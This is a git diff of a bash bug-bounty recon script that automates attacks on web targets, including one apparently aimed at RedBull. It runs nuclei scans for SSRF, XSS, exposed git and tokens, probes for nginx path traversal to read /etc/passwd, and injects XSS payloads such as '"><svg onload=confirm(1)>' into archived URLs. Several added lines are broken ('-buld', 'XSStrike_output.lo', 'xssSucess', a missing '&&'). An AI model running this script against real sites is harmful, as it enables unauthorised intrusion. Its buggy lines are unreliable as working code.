@@ -93,14 +93,12 @@ getalive() {
 #------------------------------
 # Coleta + Mapeamento especifica para RedBull
 ReconRedbull(){
-  naabuRecon
   getalive
   dnsrecords
   graphqldetect
   APIRecon
   swaggerUIdetect
   nucTakeover
-  ssrfdetect
   XssScan
   OpenRedirectScan
   nucauto
@@ -127,6 +125,7 @@ newRecon(){
   OpenRedirectScan
   GitScan
   nucauto
+  xsshunter
 }
 
 
@@ -134,7 +133,7 @@ GitScan () {
         echo "[+] Git scan"
         cat ALLHTTP | nuclei -tags git -o gitvector
         [ -s "gitvector" ] && echo "Git vector found :)" | notify -silent -id nuclei
-        [ -s "gitvector" ] && cat gitvector | notify -silent
+        [ -s "gitvector" ] && notify -silent -bulk -data gitvector -id nuclei
 }
 
 naabuRecon () {
@@ -303,7 +302,7 @@ nginxpath() {
     echo "Test nginx path traversal" | notify -silent
     ffuf -c -w ALLHTTP -u FUZZ////////../../../../../etc/passwd -mr "root:x" -or -o nginxpath.txt
     [ -s "nginxpath.txt" ] && echo 'nginx traversal found' | notify -silent
-    [ -s "nginxpath.txt" ] && cat nginxpath.txt | notify -silent
+    [ -s "nginxpath.txt" ] && notify -silent -bulk -data nginxpath.txt -id nuclei
 }
 
 # TODO: alterar para usar o match do httpx
@@ -330,21 +329,22 @@ graphqldetect() {
   echo "[+] Graphql Detect"
   cat ALLHTTP | nuclei -tags graphql -o graphqldetect
   [ -s "graphqldetect" ] && echo "Graphql endpoint found :)" | notify -silent -id api
-  [ -s "graphqldetect" ] && cat graphqldetect | notify -silent -id api
+  [ -s "graphqldetect" ] && notify -silent -bulk -data graphqldetect -id api
+
 }
 
 ssrfdetect() {
   echo "[+] SSRF Detect"
   cat ALLHTTP | nuclei -tags ssrf -o ssrfdetect
   [ -s "ssrfdetect" ] && echo "SSRF vector found :)" | notify -silent -id nuclei
-  [ -s "ssrfdetect" ] && cat ssrfdetect | notify -silent -id nuclei
+  [ -s "ssrfdetect" ] && notify -silent -bulk -data ssrfdetect -id nuclei
 }
 
 XssScan() {
   echo "[+] XSS scan"
-  cat ALLHTTP | nuclei -tags xss -es info -o xssvector
-  [ -s "xssvector" ] && echo "XSS vector found :)" | notify -silent -id xss
-  [ -s "xssvector" ] && cat xssvector | notify -silent -id xss
+  cat ALLHTTP | nuclei -tags xss -es info -o xssnuclei
+  [ -s "xssnuclei" ] && echo "XSS vector found :)" | notify -silent -id xss
+  [ -s "xssnuclei" ] && notify -silent -bulk -data xssnuclei -id xss
 }
 
 OpenRedirectScan() {
@@ -421,19 +421,27 @@ massALLHTTPWebCaching(){
 }
 
 xsshunter() {
-  
+
   echo "INIT XSS HUNTER" | notify -silent -id xss
   echo "INIT XSS HUNTER"
-  [ -s "ALLHTTP" ] && cat ALLHTTP | gauplus | uro | anew waybackdata
-  [ -s "ALLHTTP" ] && cat ALLHTTP | waybackurls | uro | anew waybackdata 
-  [ -s "waybackdata" ] && cat waybackdata | uro | gf xss | httpx -silent | anew xssvector
-  [ -s "waybackdata" ] && cat waybackdata | uro | kxss | awk '{print $9}' | anew xssvector
+  # python3 $HOME/Tools/xnLinkFinder/xnLinkFinder.py -vv -d 2 -i 200HTTP -sp 200HTTP -sf domains -o urldump.txt
+  for domain in $(cat domains)
+  do
+    python3 $HOME/Tools/Waymore/waymore.py -i $domain -mode U
+    cat $HOME/Tools/Waymore/results/$domain/waymore.txt | awk '{print tolower($0)}'  | anew urldump.txt
+  done
+  [ -s "urldump.txt" ] && cat urldump.txt | uro | kxss | awk '{print $0}' | anew xssvector
+  [ -s "urldump.txt" ] && cat urldump.txt | uro | gf xss | httpx -silent | anew xssvector
+  # [ -s "xssvector.txt" ] && dalfox file xssvector.txt --skip-bav -o XSSresult
+  # [ -s "XSSresult" ] && cat XSSresult | notify -id xss
   echo '[+] Airixss xss'
   [ -s "xssvector" ] && cat xssvector | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew airixss.txt
-  [ -s "airixss.txt" ] && cat airixss.txt | notify -silent -id xss
+  [ -s "airixss.txt" ] notify -silent -bulk -data airixss.txt -id xss
   echo '[+] Freq xss'
   [ -s "xssvector" ] && cat xssvector | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
-  [ -s "FreqXSS.txt" ] && cat FreqXSS.txt | notify -silent -id xss
+  [ -s "FreqXSS.txt" ] && notify -silent -buld -data FreqXSS.txt -id xss
+  [ -s "xssvector" ] && python3 $HOME/Tools/XSStrike-Reborn/xsstrike.py -ul xssvector -d 2 --file-log-level WARNING --log-file XSStrike_output.log
+  [ -s "XSStrike_output.log"] && notify -silent -data XSStrike_output.lo -bulk -id xss
 }
 
 
@@ -452,7 +460,7 @@ xssknox(){
   [ -s "waybackdata" ] && cat waybackdata | uro | kxss | awk '{print $9}' | anew kxssresult
   [ -s "kxssresult" ] && python3 $HOME/Tools/knoxnl/knoxnl.py -i kxssresult -s -o xssSuccess
   [ -s "xssSuccess" ] && echo "XSS FOUND WITH KNOXSS" | notify -silent -id xss
-  [ -s "xssSuccess" ] && cat xssSuccess | notify -silent -id xss
+  [ -s "xssSuccess" ] && notify -silent -bulk -data xssSucess -id xss
  }
 
 scanPortsAndNuclei(){
@@ -467,7 +475,7 @@ scanPortsAndNuclei(){
 
   echo '[+] Enumerate httpx nuclei'
   cat naabuIP.txt | nuclei -silent -o nuclei.txt -severity low,medium,high,critical
-  [ -s "nuclei.txt" ] && cat nuclei.txt | notify -silent -id nuclei 
+  [ -s "nuclei.txt" ] && notify -silent -buld -data nuclei.txt -id nuclei 
 }
 
 massHakip2host(){
@@ -485,8 +493,8 @@ nucauto() {
   cd
   git clone https://github.com/projectdiscovery/nuclei-templates.git
   cd -
-  cat ALLHTTP | nuclei -etags redirect,xss,ssrf,graphql,swagger -severity critical,high,medium,low -o resultNuclei 
-  [ -s "resultNuclei" ] && cat resultNuclei | notify -silent -id nuclei
+  cat ALLHTTP | nuclei -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl -etags redirect,xss,ssrf,graphql,swagger -severity critical,high,medium,low -o resultNuclei 
+  [ -s "resultNuclei" ] && notify -silent -bulk -data resultNuclei -id nuclei
 }
 
 faviconEnum(){
@@ -506,7 +514,7 @@ getjsurls() {
 
 getjsdata() {
   [ -s "js_livelinks.txt" ] && cat js_livelinks.txt | nuclei -tags exposure,token -o jsinfo
-  [ -s "jsinfo" ] && cat jsinfo | notify -silent -id nuclei
+  [ -s "jsinfo" ] && notify -silent -bulk -data jsinfo -id nuclei
 }
 
 secretfinder() {
